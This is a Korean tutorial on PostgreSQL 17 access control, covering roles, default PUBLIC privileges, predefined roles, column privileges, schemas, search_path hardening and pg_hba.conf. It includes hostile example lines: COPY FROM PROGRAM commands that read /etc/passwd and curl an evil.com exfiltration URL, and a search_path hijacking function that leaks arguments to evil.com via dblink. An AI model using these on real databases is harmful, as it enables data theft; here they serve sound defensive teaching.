# PostgreSQL 17 권한 관리 완전 가이드

## 한줄 요약

PostgreSQL의 권한 체계는 "누가(Role) → 어디서(pg_hba.conf) → 무엇을(Privilege) → 어떤 행까지(RLS)" 라는 4단계 레이어로 구성되며, 최소 권한 원칙에 따라 설계해야 보안 사고를 예방할 수 있습니다.

> 📖 이 노트는 PostgreSQL 17 공식 문서의 [Database Roles](https://www.postgresql.org/docs/17/user-manag.html), [Privileges](https://www.postgresql.org/docs/17/ddl-priv.html), [Row Security Policies](https://www.postgresql.org/docs/17/ddl-rowsecurity.html), [pg_hba.conf](https://www.postgresql.org/docs/17/auth-pg-hba-conf.html)를 기반으로 작성되었습니다.

## 실습 환경

```bash
# 실습 환경 시작
cd docker && docker compose up -d

# PostgreSQL 접속
docker exec -it pg17-lab psql -U labuser -d ecommerce

# 슈퍼유저로 접속 (권한 관리 작업 시)
docker exec -it pg17-lab psql -U postgres -d ecommerce
```

---

## 왜 알아야 하는가

### "어제 입사한 주니어가 프로덕션 테이블을 DROP 했습니다"

실제로 일어나는 사고입니다. PostgreSQL의 기본 설정은 생각보다 관대합니다:
- `public` 스키마에 대한 `USAGE` 권한이 모든 사용자에게 열려 있고 (PG15 이전에는 `CREATE`까지)
- 데이터베이스에 대한 `CONNECT`, `TEMPORARY` 권한이 `PUBLIC`에 부여되어 있으며
- 모든 함수의 `EXECUTE` 권한이 `PUBLIC`에 기본 부여됩니다

권한 설계를 하지 않으면, 로그인할 수 있는 모든 사용자가 모든 함수를 실행하고, 임시 테이블을 무한히 만들 수 있습니다.

### 권한 설계를 미루면 발생하는 문제들

1. **사고 복구 불가**: DROP TABLE 후 PITR 외에는 방법이 없음
2. **감사 실패**: 누가 언제 무엇을 했는지 추적 불가 → 컴플라이언스 위반
3. **퇴사자 리스크**: 계정을 지우면 소유 객체가 고아가 됨
4. **개발/운영 혼재**: 개발자가 프로덕션 DB를 직접 조작하는 구조

---

## PostgreSQL 권한 체계의 4단계 레이어

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: 인증 (Authentication) — pg_hba.conf                │
│   "이 IP에서 이 사용자가 이 DB에 접속할 수 있는가?"           │
├─────────────────────────────────────────────────────────────┤
│ Layer 2: 역할 속성 (Role Attributes) — CREATE ROLE          │
│   "이 역할은 LOGIN/SUPERUSER/CREATEDB 등의 속성이 있는가?"   │
├─────────────────────────────────────────────────────────────┤
│ Layer 3: 객체 권한 (Object Privileges) — GRANT/REVOKE       │
│   "이 역할은 이 테이블/스키마/함수에 대해 어떤 작업을 할 수    │
│    있는가?"                                                  │
├─────────────────────────────────────────────────────────────┤
│ Layer 4: 행 수준 보안 (Row Level Security) — CREATE POLICY   │
│   "이 역할은 이 테이블의 어떤 행을 볼 수 있는가?"             │
└─────────────────────────────────────────────────────────────┘
```

각 레이어는 독립적으로 동작하며, **모든 레이어를 통과해야** 데이터에 접근할 수 있습니다.

---

## 1. Role 시스템 — 사용자도 그룹도 결국 Role

### 핵심 개념: PostgreSQL에는 "사용자"가 없다

PostgreSQL 8.1부터 User와 Group은 통합되어 **Role**이라는 단일 개념으로 관리됩니다. `CREATE USER`는 `CREATE ROLE ... LOGIN`의 별칭(alias)일 뿐입니다.

```sql
-- 이 두 문장은 완전히 동일합니다
CREATE USER alice WITH PASSWORD 'secure_pass';
CREATE ROLE alice WITH LOGIN PASSWORD 'secure_pass';
```

> **공식 문서**: "CREATE USER is equivalent to CREATE ROLE except that LOGIN is assumed by default."
> — [SQL Commands: CREATE ROLE](https://www.postgresql.org/docs/17/sql-createrole.html)

### Role의 두 가지 용도

| 용도 | LOGIN 속성 | 비유 | 예시 |
|------|-----------|------|------|
| **사용자 Role** | `LOGIN` | 회사 출입증을 가진 사람 | `alice`, `backend_app` |
| **그룹 Role** | `NOLOGIN` (기본값) | 부서/팀 | `readonly_team`, `dev_team` |

```sql
-- 그룹 Role (직접 로그인 불가, 권한 묶음 역할)
CREATE ROLE backend_team;
CREATE ROLE analyst_team;
CREATE ROLE dba_team;

-- 사용자 Role (실제 사람 또는 애플리케이션)
CREATE ROLE alice LOGIN PASSWORD 'alice_secure_2024';
CREATE ROLE bob LOGIN PASSWORD 'bob_secure_2024';
CREATE ROLE app_api LOGIN PASSWORD 'api_service_key';

-- 사용자를 그룹에 소속시키기
GRANT backend_team TO alice;
GRANT analyst_team TO bob;
GRANT dba_team TO alice;  -- alice는 backend_team + dba_team 양쪽 소속
```

### Role 속성 완전 정리

```sql
CREATE ROLE role_name WITH
    LOGIN | NOLOGIN                    -- 로그인 가능 여부 (기본: NOLOGIN)
    SUPERUSER | NOSUPERUSER            -- 모든 권한 검사 우회 (기본: NOSUPERUSER)
    CREATEDB | NOCREATEDB              -- 데이터베이스 생성 가능 (기본: NOCREATEDB)
    CREATEROLE | NOCREATEROLE          -- 다른 Role 생성/관리 가능 (기본: NOCREATEROLE)
    REPLICATION | NOREPLICATION        -- 복제 연결 가능 (기본: NOREPLICATION)
    BYPASSRLS | NOBYPASSRLS            -- RLS 정책 우회 (기본: NOBYPASSRLS)
    INHERIT | NOINHERIT                -- 소속 그룹 권한 자동 상속 (기본: INHERIT)
    CONNECTION LIMIT connlimit         -- 최대 동시 연결 수 (기본: -1, 무제한)
    PASSWORD 'password' | PASSWORD NULL -- 비밀번호 (기본: NULL)
    VALID UNTIL 'timestamp'            -- 비밀번호 만료 시점 (기본: 무기한)
    IN ROLE role_name [, ...]          -- 생성 시 바로 소속될 그룹
    ROLE role_name [, ...]             -- 이 Role에 바로 추가할 멤버
    ADMIN role_name [, ...]            -- 이 Role에 ADMIN으로 추가할 멤버
;
```

#### 각 속성의 의미와 위험도

| 속성 | 위험도 | 설명 | 주의사항 |
|------|--------|------|---------|
| `SUPERUSER` | 🔴 최고 | 모든 권한 검사를 우회합니다 | 프로덕션에서 최소 1개만 유지. 일상 업무에 절대 사용 금지 |
| `CREATEROLE` | 🟠 높음 | 다른 Role을 생성/수정/삭제할 수 있습니다 | PG16+에서 강화됨. 자신이 만든 Role에 대한 ADMIN 자동 부여 |
| `CREATEDB` | 🟡 중간 | 새 데이터베이스를 생성할 수 있습니다 | 무분별한 DB 생성으로 디스크 고갈 가능 |
| `REPLICATION` | 🟠 높음 | 복제 슬롯 생성 및 WAL 스트리밍 가능 | 전체 DB 내용을 읽을 수 있으므로 신뢰할 수 있는 역할에만 부여 |
| `BYPASSRLS` | 🟠 높음 | RLS 정책을 무시하고 모든 행에 접근 | RLS를 사용하는 환경에서는 매우 제한적으로 부여 |
| `LOGIN` | 🟢 낮음 | DB에 직접 접속 가능 | 그룹 Role에는 부여하지 않음 |
| `INHERIT` | 🟢 낮음 | 소속 그룹의 권한을 자동 상속 | PG16+에서 per-membership으로 변경됨 |

#### SUPERUSER가 위험한 이유

```sql
-- SUPERUSER는 다음을 모두 할 수 있습니다:
-- ✅ 모든 테이블의 모든 행을 SELECT/INSERT/UPDATE/DELETE
-- ✅ 모든 객체를 DROP (다른 사용자 소유 포함)
-- ✅ 모든 Role의 비밀번호 변경
-- ✅ pg_hba.conf에서 reject로 설정해도 우회
-- ✅ RLS 정책 무시
-- ✅ 서버 설정 변경 (ALTER SYSTEM)
-- ✅ 서버 종료

-- 따라서 프로덕션에서는:
-- 1. superuser 계정은 비상용으로만 사용
-- 2. 일상 업무용 DBA 계정은 CREATEROLE + CREATEDB + pg_monitor 조합 사용
```

### CREATEROLE의 PG16+ 변경사항 (PG17 적용)

PG16부터 `CREATEROLE`의 동작이 크게 변경되었습니다:

```sql
-- PG16+ 에서 CREATEROLE 가진 역할이 새 역할을 만들면:
CREATE ROLE team_lead WITH CREATEROLE LOGIN PASSWORD 'lead_pass';

-- team_lead가 새 역할을 만들 때:
SET ROLE team_lead;
CREATE ROLE new_member WITH LOGIN PASSWORD 'member_pass';

-- PG16+에서는 자동으로 다음이 실행됩니다:
-- GRANT new_member TO team_lead WITH ADMIN TRUE, SET FALSE, INHERIT FALSE;
--
-- → team_lead는 new_member를 관리(ADMIN)할 수 있지만
-- → team_lead가 new_member의 권한을 자동 상속(INHERIT)하지 않음
-- → team_lead가 SET ROLE new_member로 전환할 수 없음
-- 이것은 보안을 위한 의도적 설계입니다
```

**CREATEROLE로 할 수 없는 것:**
- `SUPERUSER` 속성을 가진 Role 생성/수정
- `REPLICATION` 속성 부여
- `BYPASSRLS` 속성 부여

### Role 멤버십과 INHERIT (PG16+ per-membership)

PG16부터 `INHERIT`는 Role 속성이 아닌 **멤버십 단위**로 제어됩니다:

```sql
CREATE ROLE alice LOGIN PASSWORD 'alice_pass';
CREATE ROLE backend_team;   -- 일반 개발 권한
CREATE ROLE security_team;  -- 민감 데이터 접근 권한
CREATE ROLE ops_team;       -- 운영 권한

-- alice를 각 그룹에 소속시키되, INHERIT 여부를 개별 설정
GRANT backend_team TO alice WITH INHERIT TRUE;     -- 자동 상속 ✅
GRANT security_team TO alice WITH INHERIT FALSE;   -- 명시적 SET ROLE 필요 ⛔
GRANT ops_team TO alice WITH INHERIT TRUE, SET FALSE;  -- 상속은 하되 SET ROLE 불가 🔒
```

이 설정에서 alice의 권한:
- **평소**: alice 자신의 권한 + backend_team 권한 + ops_team 권한 (자동 상속)
- `SET ROLE security_team`: security_team 권한만 사용 (명시적 전환)
- `SET ROLE ops_team`: **불가** (SET FALSE이므로)

```sql
-- SET ROLE 사용법
SET ROLE security_team;  -- security_team 권한으로 전환
-- ... 민감 작업 수행 ...
RESET ROLE;              -- 원래 alice 권한으로 복귀
```

> **왜 이런 설계인가?** 민감한 권한은 "무의식적 상속"이 아닌 "의식적 전환"을 통해서만 사용하게 하기 위함입니다.
> 마치 `sudo`를 입력해야 관리자 권한을 쓸 수 있는 것과 같은 개념입니다.

#### 주의: Role 속성은 절대 상속되지 않는다

```sql
CREATE ROLE admin_group WITH CREATEDB CREATEROLE;
GRANT admin_group TO alice WITH INHERIT TRUE;

-- alice는 admin_group의 "객체 권한" (SELECT, INSERT 등)은 상속받지만
-- CREATEDB, CREATEROLE 같은 "Role 속성"은 상속받지 않습니다!
-- alice가 CREATEDB를 사용하려면:
SET ROLE admin_group;
CREATE DATABASE new_db;
```

> **공식 문서**: "Role attributes (LOGIN, SUPERUSER, CREATEDB, CREATEROLE, REPLICATION, BYPASSRLS) are never inherited as ordinary privileges."
> — [Role Membership](https://www.postgresql.org/docs/17/role-membership.html)

### GRANT OPTION과 권한 위임

```sql
-- alice에게 orders 테이블의 SELECT 권한 + 위임 권한 부여
GRANT SELECT ON orders TO alice WITH GRANT OPTION;

-- 이제 alice가 다른 사용자에게 SELECT 권한을 부여할 수 있음
SET ROLE alice;
GRANT SELECT ON orders TO bob;  -- alice가 bob에게 위임

-- 위임 체인의 위험:
-- dba → alice (WITH GRANT OPTION) → bob → charlie
-- dba가 alice의 GRANT OPTION을 REVOKE하면 bob, charlie도 연쇄 취소됨

-- GRANT OPTION만 취소 (권한은 유지)
REVOKE GRANT OPTION FOR SELECT ON orders FROM alice;
-- alice는 여전히 SELECT 가능하지만, 더 이상 다른 사용자에게 위임 불가

-- 연쇄 취소 (CASCADE)
REVOKE SELECT ON orders FROM alice CASCADE;
-- alice + alice가 위임한 bob + bob이 위임한 charlie 모두 취소
```

### Role 멤버십도 위임 가능 (ADMIN OPTION)

```sql
-- alice에게 backend_team의 멤버 관리 권한 부여
GRANT backend_team TO alice WITH ADMIN TRUE;

-- 이제 alice가 다른 사용자를 backend_team에 추가/제거 가능
SET ROLE alice;
GRANT backend_team TO charlie;   -- charlie를 팀에 추가
REVOKE backend_team FROM bob;    -- bob을 팀에서 제거
```

---

## 2. PUBLIC에 기본 부여되는 권한 — 반드시 점검해야 할 항목

PostgreSQL은 설치 직후 `PUBLIC` (모든 역할을 의미하는 특수 그룹)에 상당한 권한을 기본 부여합니다.

### PUBLIC 기본 권한 전체 목록

| 객체 유형 | PUBLIC 기본 권한 | 전체 권한 | 보안 조치 필요? |
|----------|----------------|----------|---------------|
| **DATABASE** | `CONNECT`, `TEMPORARY` | `CREATE`, `CONNECT`, `TEMPORARY` | 🟠 필요에 따라 REVOKE |
| **FUNCTION / PROCEDURE** | `EXECUTE` | `EXECUTE` | 🔴 반드시 검토 |
| **LANGUAGE** | `USAGE` | `USAGE` | 🟡 plpgsql 등 |
| **TYPE / DOMAIN** | `USAGE` | `USAGE` | 🟢 보통 무해 |
| **TABLE** | *없음* | SELECT~MAINTAIN | ✅ 안전 |
| **SEQUENCE** | *없음* | USAGE, SELECT, UPDATE | ✅ 안전 |
| **SCHEMA** | *없음* (PG15+) | CREATE, USAGE | ✅ PG15+에서 개선됨 |

### 즉시 조치해야 할 것들

```sql
-- 1. 불필요한 데이터베이스 CONNECT 권한 제거
-- (특정 사용자만 접속하게 하려면)
REVOKE CONNECT ON DATABASE ecommerce FROM PUBLIC;
GRANT CONNECT ON DATABASE ecommerce TO backend_team, analyst_team, dba_team;

-- 2. 함수 EXECUTE 권한 제거 (매우 중요!)
-- PUBLIC에 EXECUTE가 기본 부여되므로, 민감한 함수는 반드시 제거
REVOKE EXECUTE ON FUNCTION admin_reset_password(TEXT, TEXT) FROM PUBLIC;
GRANT EXECUTE ON FUNCTION admin_reset_password(TEXT, TEXT) TO dba_team;

-- 3. 향후 생성되는 함수에도 적용
ALTER DEFAULT PRIVILEGES REVOKE EXECUTE ON FUNCTIONS FROM PUBLIC;

-- 4. public 스키마의 CREATE 권한 확인 (PG15+ 기본 해제됨)
-- PG14 이하에서 업그레이드한 경우 수동으로 해야 함
REVOKE CREATE ON SCHEMA public FROM PUBLIC;

-- 5. TEMPORARY 테이블 생성 제한 (디스크 고갈 방지)
REVOKE TEMPORARY ON DATABASE ecommerce FROM PUBLIC;
GRANT TEMPORARY ON DATABASE ecommerce TO backend_team;
```

> **왜 함수의 PUBLIC EXECUTE가 위험한가?**
> 모든 로그인 가능한 사용자가 어떤 함수든 호출할 수 있습니다. 만약 `SECURITY DEFINER` 함수가 있다면
> (함수 소유자 권한으로 실행됨), 일반 사용자가 소유자 권한을 간접적으로 사용할 수 있습니다.

---

## 3. Predefined Roles (사전 정의 역할) — PG17 완전 정리

PostgreSQL 17에는 **15개의 사전 정의 역할**이 있습니다. 직접 권한을 구성하는 대신 이 역할들을 활용하면 안전하고 효율적입니다.

### 모니터링 관련

| Role | 용도 | 위험도 |
|------|------|--------|
| `pg_monitor` | 아래 3개를 모두 포함하는 편의 역할 | 🟢 |
| `pg_read_all_settings` | `SHOW` 및 `pg_settings`에서 superuser 전용 설정도 읽기 | 🟢 |
| `pg_read_all_stats` | 모든 `pg_stat_*` 뷰 읽기 | 🟢 |
| `pg_stat_scan_tables` | `ACCESS SHARE` 락이 필요한 모니터링 함수 실행 | 🟢 |

```sql
-- 모니터링 전용 계정 생성
CREATE ROLE grafana_monitor LOGIN PASSWORD 'monitor_pass';
GRANT pg_monitor TO grafana_monitor;
-- 이제 grafana_monitor는 모든 통계와 설정을 조회할 수 있지만
-- 데이터를 수정하거나 테이블 내용을 읽을 수는 없습니다
```

### 데이터 접근 관련

| Role | 용도 | 위험도 |
|------|------|--------|
| `pg_read_all_data` | 모든 스키마의 모든 테이블/뷰/시퀀스에 대해 SELECT + USAGE | 🟠 |
| `pg_write_all_data` | 모든 스키마의 모든 테이블/뷰/시퀀스에 대해 INSERT/UPDATE/DELETE + USAGE | 🔴 |

```sql
-- 분석팀에 읽기 전용 전체 접근 부여
GRANT pg_read_all_data TO analyst_team;

-- 주의: pg_read_all_data는 BYPASSRLS를 포함하지 않습니다!
-- RLS가 설정된 테이블에서는 정책에 따라 행이 필터링됩니다
```

> **실무 팁**: `pg_read_all_data`는 스키마가 추가되거나 테이블이 추가될 때마다 자동으로 접근 가능하므로, `GRANT SELECT ON ALL TABLES`보다 유지보수가 쉽습니다. 다만 "새로 추가된 민감 테이블에도 자동 접근"되는 점을 인식해야 합니다.

### 운영/유지보수 관련

| Role | 용도 | 위험도 |
|------|------|--------|
| `pg_maintain` | 모든 테이블에 VACUUM, ANALYZE, CLUSTER, REINDEX, REFRESH MATERIALIZED VIEW, LOCK | 🟡 |
| `pg_checkpoint` | `CHECKPOINT` 명령 실행 | 🟢 |
| `pg_signal_backend` | 다른 세션의 쿼리 취소(`pg_cancel_backend`) / 종료(`pg_terminate_backend`) | 🟡 |
| `pg_use_reserved_connections` | `reserved_connections` 파라미터로 예약된 연결 슬롯 사용 | 🟢 |

```sql
-- DBA 팀에 유지보수 역할 부여
GRANT pg_maintain TO dba_team;
GRANT pg_signal_backend TO dba_team;
GRANT pg_checkpoint TO dba_team;

-- 예약 연결: DBA는 DB가 max_connections에 도달해도 접속 가능
-- postgresql.conf: reserved_connections = 3
GRANT pg_use_reserved_connections TO dba_team;
```

### 파일 시스템 접근 (⚠️ 매우 위험)

| Role | 용도 | 위험도 |
|------|------|--------|
| `pg_read_server_files` | `COPY ... FROM` 등으로 서버 파일 시스템 읽기 | 🔴 |
| `pg_write_server_files` | `COPY ... TO` 등으로 서버 파일 시스템 쓰기 | 🔴 |
| `pg_execute_server_program` | `COPY ... FROM PROGRAM` 등으로 서버에서 프로그램 실행 | 🔴🔴 |

```sql
-- ⚠️ 이 역할들은 사실상 OS 레벨 접근을 허용합니다
-- pg_execute_server_program은 다음과 같은 것이 가능해집니다:
-- COPY data FROM PROGRAM 'cat /etc/passwd';
-- COPY data FROM PROGRAM 'curl http://evil.com/exfil?data=...';
-- 절대로 일반 사용자에게 부여하지 마세요
```

### 기타

| Role | 용도 | 위험도 |
|------|------|--------|
| `pg_database_owner` | 현재 데이터베이스의 소유자를 의미하는 암시적 역할 | — |
| `pg_create_subscription` | CREATE SUBSCRIPTION 실행 (+ DB에 CREATE 권한 필요) | 🟡 |

---

## 4. 전체 권한 유형 — 15가지 Privilege

### 한눈에 보는 전체 Privilege

| 권한 | ACL 약어 | 대상 객체 | 설명 |
|------|---------|----------|------|
| `SELECT` | `r` (read) | 테이블, 뷰, 시퀀스, 컬럼 | 행 읽기, COPY TO |
| `INSERT` | `a` (append) | 테이블, 뷰, 컬럼 | 행 삽입, COPY FROM |
| `UPDATE` | `w` (write) | 테이블, 뷰, 시퀀스, 컬럼 | 행 수정, nextval(), setval() |
| `DELETE` | `d` | 테이블, 뷰 | 행 삭제 (SELECT도 필요) |
| `TRUNCATE` | `D` | 테이블 | 테이블 전체 행 삭제 |
| `REFERENCES` | `x` | 테이블, 컬럼 | FK 제약조건의 참조 대상으로 사용 |
| `TRIGGER` | `t` | 테이블, 뷰 | 트리거 생성 |
| `CREATE` | `C` | DB, 스키마, 테이블스페이스 | 객체 생성 |
| `CONNECT` | `c` | DB | DB 접속 (pg_hba.conf 이후 검사) |
| `TEMPORARY` | `T` | DB | 임시 테이블 생성 |
| `EXECUTE` | `X` | 함수, 프로시저 | 함수/프로시저 호출 |
| `USAGE` | `U` | 스키마, 시퀀스, 언어, 타입, FDW 등 | 스키마 내 객체 접근, 시퀀스 currval/nextval |
| `SET` | `s` | 설정 파라미터 | `SET parameter = value` |
| `ALTER SYSTEM` | `A` | 설정 파라미터 | `ALTER SYSTEM SET parameter = value` |
| `MAINTAIN` | `m` | 테이블 | VACUUM, ANALYZE, REINDEX 등 유지보수 |

### ACL 표기법 읽는 법

`\dp` (또는 `\z`) 명령으로 확인할 수 있는 ACL 표기법:

```
grantee=privileges/grantor

예시:
alice=arwdDxt/postgres    -- alice가 postgres로부터 받은 SELECT~TRIGGER 권한
=r/postgres               -- PUBLIC이 postgres로부터 받은 SELECT 권한
bob=r*w/alice             -- bob이 alice로부터 받은 SELECT(+위임권)+UPDATE 권한
                          -- * 는 GRANT OPTION이 있음을 의미
```

```sql
-- 실제 확인
\dp orders

-- 출력 예시:
--                                  Access privileges
--  Schema |  Name  | Type  |     Access privileges      | Column privileges | Policies
-- --------+--------+-------+----------------------------+-------------------+---------
--  public | orders | table | postgres=arwdDxtm/postgres+|                   |
--         |        |       | backend_team=arwd/postgres+|                   |
--         |        |       | analyst_team=r/postgres     |                   |
```

### 컬럼 레벨 권한 — 민감 컬럼 보호

컬럼 레벨 권한은 `SELECT`, `INSERT`, `UPDATE`, `REFERENCES`에만 적용 가능합니다:

```sql
-- 고객 서비스팀: 기본 정보만 조회 가능, 민감 정보 접근 차단
GRANT SELECT (id, username, email, created_at, status) ON users TO cs_team;
-- password_hash, phone, address 등은 접근 불가

-- 주문 처리팀: status 컬럼만 수정 가능
GRANT SELECT ON orders TO fulfillment_team;
GRANT UPDATE (status, tracking_number) ON orders TO fulfillment_team;
-- 금액, 사용자 정보 등은 수정 불가
```

> **주의**: 테이블 레벨 `REVOKE`와 컬럼 레벨 `GRANT`는 독립적입니다.
> 테이블 레벨 SELECT를 REVOKE해도, 별도로 부여한 컬럼 레벨 SELECT는 유지됩니다.

### USAGE 권한 — 자주 놓치는 필수 권한

스키마의 `USAGE` 권한이 없으면, 그 스키마 안의 테이블에 SELECT 권한이 있어도 접근할 수 없습니다:

```sql
-- 이것만으로는 접근 불가!
GRANT SELECT ON myschema.users TO alice;

-- USAGE도 반드시 부여해야 함
GRANT USAGE ON SCHEMA myschema TO alice;
GRANT SELECT ON myschema.users TO alice;
-- 이제 접근 가능
```

시퀀스도 마찬가지입니다:

```sql
-- INSERT 시 serial/identity 컬럼 사용하려면 시퀀스 USAGE 필요
GRANT INSERT ON orders TO app_role;
GRANT USAGE ON SEQUENCE orders_id_seq TO app_role;

-- 또는 스키마 내 모든 시퀀스에 한번에
GRANT USAGE ON ALL SEQUENCES IN SCHEMA public TO app_role;
```

---

## 5. ALTER DEFAULT PRIVILEGES — 미래 객체에 대한 권한 설정

`GRANT`는 **현재 존재하는 객체**에만 적용됩니다. 새로 만들어지는 테이블에는 적용되지 않습니다.

### 문제 상황

```sql
-- 현재 존재하는 모든 테이블에 SELECT 부여
GRANT SELECT ON ALL TABLES IN SCHEMA public TO analyst_team;

-- 2주 후 개발자가 새 테이블을 생성
CREATE TABLE customer_segments (...);

-- analyst_team은 customer_segments를 볼 수 없습니다!
-- 매번 수동으로 GRANT를 해줘야 합니다
```

### 해결: ALTER DEFAULT PRIVILEGES

```sql
-- 앞으로 public 스키마에 생성되는 모든 테이블에 자동으로 SELECT 부여
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT SELECT ON TABLES TO analyst_team;

-- 앞으로 생성되는 모든 시퀀스에 USAGE 자동 부여
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT USAGE ON SEQUENCES TO backend_team;

-- 앞으로 생성되는 모든 함수에서 PUBLIC의 EXECUTE 자동 제거
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    REVOKE EXECUTE ON FUNCTIONS FROM PUBLIC;
```

### 핵심 주의사항

```sql
-- ⚠️ 1. "누가 만든" 객체에 적용되는가?
-- ALTER DEFAULT PRIVILEGES는 실행한 역할이 만든 객체에만 적용됩니다!

-- postgres가 실행:
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT SELECT ON TABLES TO analyst_team;

-- postgres가 만든 테이블 → analyst_team SELECT 적용 ✅
-- alice가 만든 테이블 → 적용 안 됨 ⛔

-- alice가 만든 테이블에도 적용하려면:
ALTER DEFAULT PRIVILEGES FOR ROLE alice IN SCHEMA public
    GRANT SELECT ON TABLES TO analyst_team;
-- 이 명령은 alice 자신이나 alice에 대한 ADMIN을 가진 역할이 실행

-- ⚠️ 2. 기존 객체에는 소급 적용되지 않습니다!
-- 반드시 기존 객체 GRANT + 미래 객체 ALTER DEFAULT PRIVILEGES 둘 다 해야 합니다

-- ⚠️ 3. psql에서 현재 설정 확인
\ddp
-- 또는
SELECT * FROM pg_default_acl;
```

### 실전 패턴: 기존 + 미래 모두 커버

```sql
-- 팀별 권한을 설정할 때 항상 이 패턴을 사용하세요:

-- [기존 객체] + [미래 객체] 쌍으로 설정
-- 1. 테이블 읽기
GRANT SELECT ON ALL TABLES IN SCHEMA public TO analyst_team;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT SELECT ON TABLES TO analyst_team;

-- 2. 시퀀스 사용
GRANT USAGE ON ALL SEQUENCES IN SCHEMA public TO backend_team;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT USAGE ON SEQUENCES TO backend_team;

-- 3. 함수 실행
GRANT EXECUTE ON ALL FUNCTIONS IN SCHEMA public TO backend_team;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT EXECUTE ON FUNCTIONS TO backend_team;
```

---

## 6. 스키마 기반 접근 제어 — 논리적 분리

### 스키마를 사용한 권한 분리

하나의 데이터베이스 안에서 스키마로 영역을 나누면, RBAC(역할 기반 접근 제어)을 깔끔하게 구현할 수 있습니다:

```sql
-- 스키마 생성
CREATE SCHEMA core;        -- 핵심 비즈니스 테이블
CREATE SCHEMA analytics;   -- 분석용 집계/뷰
CREATE SCHEMA staging;     -- ETL 스테이징 영역
CREATE SCHEMA audit;       -- 감사 로그

-- 스키마별 권한 설정
-- core: backend_team만 읽기/쓰기
GRANT USAGE ON SCHEMA core TO backend_team;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA core TO backend_team;
ALTER DEFAULT PRIVILEGES IN SCHEMA core
    GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO backend_team;

-- analytics: analyst_team은 읽기만, backend_team은 쓰기도 가능
GRANT USAGE ON SCHEMA analytics TO analyst_team, backend_team;
GRANT SELECT ON ALL TABLES IN SCHEMA analytics TO analyst_team;
GRANT ALL ON ALL TABLES IN SCHEMA analytics TO backend_team;

-- staging: ETL 프로세스만 접근
GRANT ALL ON SCHEMA staging TO etl_role;
-- 다른 팀은 staging 스키마의 USAGE조차 없으므로 존재 자체를 알 수 없음

-- audit: DBA만 읽기, 쓰기는 감사 트리거만 가능
GRANT USAGE ON SCHEMA audit TO dba_team;
GRANT SELECT ON ALL TABLES IN SCHEMA audit TO dba_team;
```

### search_path 보안 — 자주 간과되는 공격 벡터

`search_path`는 SQL에서 스키마를 명시하지 않았을 때 검색 순서를 결정합니다.

```sql
-- 기본 search_path
SHOW search_path;
-- "$user", public

-- 이 의미:
-- SELECT * FROM orders; 실행 시
-- 1. $user 스키마 (예: alice.orders) 먼저 검색
-- 2. 없으면 public.orders 검색
```

#### 공격 시나리오

```sql
-- public 스키마에 CREATE 권한이 있는 악의적 사용자가:
CREATE FUNCTION public.upper(text) RETURNS text AS $$
BEGIN
    -- 원래 결과를 반환하면서 몰래 데이터를 유출
    PERFORM dblink_exec('host=evil.com ...',
        'INSERT INTO stolen VALUES (' || quote_literal($1) || ')');
    RETURN pg_catalog.upper($1);  -- 정상 결과 반환
END;
$$ LANGUAGE plpgsql;

-- 다른 사용자가 upper() 호출 시 악성 함수가 실행될 수 있음
```

#### 안전한 search_path 설정

```sql
-- 방법 1: public 스키마에서 CREATE 제거 (PG15+ 기본값)
REVOKE CREATE ON SCHEMA public FROM PUBLIC;

-- 방법 2: 사용자별 전용 스키마 사용
CREATE SCHEMA alice AUTHORIZATION alice;
-- search_path의 "$user"가 alice 스키마로 해석됨

-- 방법 3: search_path 고정
ALTER ROLE app_api SET search_path = 'core, pg_catalog';
-- app_api는 core 스키마와 시스템 카탈로그만 검색

-- 방법 4: SECURITY DEFINER 함수에서 반드시 search_path 고정
CREATE FUNCTION admin_function() RETURNS void
    LANGUAGE plpgsql
    SECURITY DEFINER
    SET search_path = pg_catalog, core  -- 함수 내부에서 사용할 search_path 고정
AS $$
BEGIN
    -- 안전한 함수 본문
END;
$$;
```

> **공식 문서**: "It is always secure to fully qualify all names in queries and function definitions."
> — [Schema Security](https://www.postgresql.org/docs/17/ddl-schemas.html#DDL-SCHEMAS-PATTERNS)

---

## 7. pg_hba.conf — 네트워크 레벨 접근 제어

### 동작 원리

```
클라이언트 연결 요청
        │
        ▼
  pg_hba.conf 순차 스캔
  ┌──────────────────────┐
  │ 첫 번째 규칙과 매칭?  │──→ YES → 해당 인증 방식 적용
  │                      │         │
  │                      │         ├→ 인증 성공 → 접속 허용
  │                      │         └→ 인증 실패 → 접속 거부 (다음 규칙 확인 ⛔)
  └──────────────────────┘
        │ NO
        ▼
  다음 규칙과 매칭? ...
        │
        ▼
  (모든 규칙 불일치)
  → 접속 거부
```

**핵심 규칙**: 첫 번째 매칭 규칙이 적용됩니다. 이후 규칙은 확인하지 않습니다. 인증 방식이 맞지 않아 실패해도 다음 규칙으로 넘어가지 않습니다.

### 레코드 형식

```
TYPE     DATABASE     USER     ADDRESS     METHOD     [OPTIONS]
```

| 필드 | 설명 | 특수 값 |
|------|------|---------|
| TYPE | 연결 유형 | `local`, `host`, `hostssl`, `hostnossl`, `hostgssenc`, `hostnogssenc` |
| DATABASE | 대상 DB | `all`, `sameuser`, `samerole`, `replication`, DB이름, `/regex` |
| USER | 대상 사용자 | `all`, 사용자명, `+group`(그룹 멤버), `/regex` |
| ADDRESS | 클라이언트 IP | CIDR(`192.168.1.0/24`), 호스트명(`.example.com`), `all`, `samehost` |
| METHOD | 인증 방식 | `trust`, `reject`, `scram-sha-256`, `md5`, `peer`, `cert`, `ldap` 등 |

### 인증 방식 선택 가이드

| 방식 | 보안 수준 | 사용 시나리오 |
|------|----------|-------------|
| `scram-sha-256` | 🟢 최고 | **기본 선택**. 비밀번호 기반 인증의 표준 |
| `cert` | 🟢 최고 | mTLS. 인증서 기반, 서비스 간 통신에 적합 |
| `peer` | 🟢 높음 | 로컬 Unix 소켓 전용. OS 사용자명과 매칭 |
| `ldap` | 🟡 중간 | 사내 LDAP/AD 연동. 중앙 집중 관리 |
| `md5` | 🟡 중간 | 레거시 호환용. 새 환경에서는 scram-sha-256 사용 |
| `password` | 🔴 위험 | 평문 전송. 절대 사용 금지 (SSL 있어도 비권장) |
